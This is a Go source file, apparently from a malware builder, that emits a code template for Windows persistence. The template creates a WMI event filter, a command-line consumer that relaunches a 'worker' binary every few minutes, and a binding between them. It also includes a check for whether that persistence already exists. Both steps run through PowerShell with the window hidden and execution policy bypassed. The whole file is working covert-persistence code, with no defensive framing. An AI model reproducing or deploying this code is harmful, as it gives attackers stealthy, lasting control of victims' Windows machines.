package buildergen

import "strings"

func templateWmiPersist() string {
	return strings.TrimSpace(`
func opAddWmiPersistence(workerPath string) {
	filterName := getDisplayName() + "_Filter"
	consumerName := getDisplayName() + "_Consumer"
	cmdLine := "\"" + workerPath + "\" worker"

	psScript := fmt.Sprintf(
		"$f=[wmiclass]\"root\\subscription:__EventFilter\";"+
			"$fi=$f.CreateInstance();"+
			"$fi.Name='%s';"+
			"$fi.EventNamespace='root\\cimv2';"+
			"$fi.QueryLanguage='WQL';"+
			"$fi.Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"';"+
			"$fi.Put();"+
			"$c=[wmiclass]\"root\\subscription:CommandLineEventConsumer\";"+
			"$ci=$c.CreateInstance();"+
			"$ci.Name='%s';"+
			"$ci.CommandLineTemplate='%s';"+
			"$ci.Put();"+
			"$b=[wmiclass]\"root\\subscription:__FilterToConsumerBinding\";"+
			"$bi=$b.CreateInstance();"+
			"$bi.Filter=$fi.__PATH;"+
			"$bi.Consumer=$ci.__PATH;"+
			"$bi.Put()",
		filterName, consumerName, strings.ReplaceAll(cmdLine, "'", "''"))

	cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", psScript)
	_ = cmd.Run()
}

func isWmiPersistencePresent() bool {
	filterName := getDisplayName() + "_Filter"
	psCheck := fmt.Sprintf(
		"$r=Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='%s'\" -ErrorAction SilentlyContinue;if($r){exit 0}else{exit 1}",
		filterName)
	cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", psCheck)
	return cmd.Run() == nil
}
`)
}
